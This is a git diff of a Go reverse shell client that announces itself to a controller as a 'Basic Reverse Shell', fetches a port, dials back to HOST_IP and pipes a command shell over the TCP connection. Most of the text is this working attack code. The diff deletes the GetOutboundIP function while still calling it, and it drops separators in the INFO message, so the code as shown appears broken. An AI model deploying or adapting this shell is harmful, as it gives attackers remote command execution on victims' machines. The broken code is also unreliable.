@@ -2,14 +2,13 @@ package main
 
 import (
 	"bufio"
-	"encoding/base64"
 	"fmt"
 	"net"
 	"os/exec"
 	"runtime"
 )
 
-var HOST_IP string = "192.168.1.3"
+var HOST_IP string = GetOutboundIP() //"192.168.3.6"
 
 func main() {
 	connectPort := GetPort()
@@ -28,7 +27,17 @@ func GetPort() string {
 	}
 	defer getPort.Close()
 	// ip := GetOutboundIP()
-	it, err := getPort.Write([]byte("INFO:{clientType:Basic Reverse Shell,lanIP:" + GetOutboundIP() + ",isEncoded:false}\n"))
+	osFlavor := "n/a"
+	// TODO: add OS flavor
+
+	it, err := getPort.Write([]byte(
+		"INFO:{clientType:Basic Reverse Shell," +
+			"lanIP:" + GetOutboundIP() + "," +
+			"isEncoded:false" +
+			"os:" + runtime.GOOS +
+			"osFlavor:" + osFlavor +
+			"\n",
+	))
 	if err != nil {
 		fmt.Println(err.Error())
 		fmt.Println(it)
@@ -36,22 +45,6 @@ func GetPort() string {
 	port, _ := bufio.NewReader(getPort).ReadString('\n')
 	return port
 }
-
-func GetOutboundIP() string {
-	//Dial a connection to a WAN IP to get the box's correct IP address.
-	//Note that this doesn't actually establish a connection,
-	//but simply pretends to setup one. This is enough to get us the IP
-	conn, err := net.Dial("udp", "8.8.8.8:80")
-	if err != nil {
-		return "none"
-	}
-	defer conn.Close()
-	localAddr := conn.LocalAddr().(*net.UDPAddr)
-	ip := localAddr.IP
-	ipstr := ip.String()
-	return ipstr
-}
-
 func EstablishConnection(port string) {
 	//Establish reverse connection to host
 	con, _ := net.Dial("tcp", HOST_IP+":"+port)
@@ -66,23 +59,4 @@ func EstablishConnection(port string) {
 	cmd.Stdout = con
 	cmd.Stderr = con
 	cmd.Run()
-}
-
-/**
-Base 64 encode a message to be sent to the server
-*/
-func b64_encode(text string) string {
-	encoded := base64.StdEncoding.EncodeToString([]byte(text))
-	return encoded
-}
-
-/**
-base 64 decode a message from the server
-*/
-func b64_decode(text string) string {
-	decoded, err := base64.StdEncoding.DecodeString(text)
-	if err != nil {
-		fmt.Println(err)
-	}
-	return string(decoded)
 }
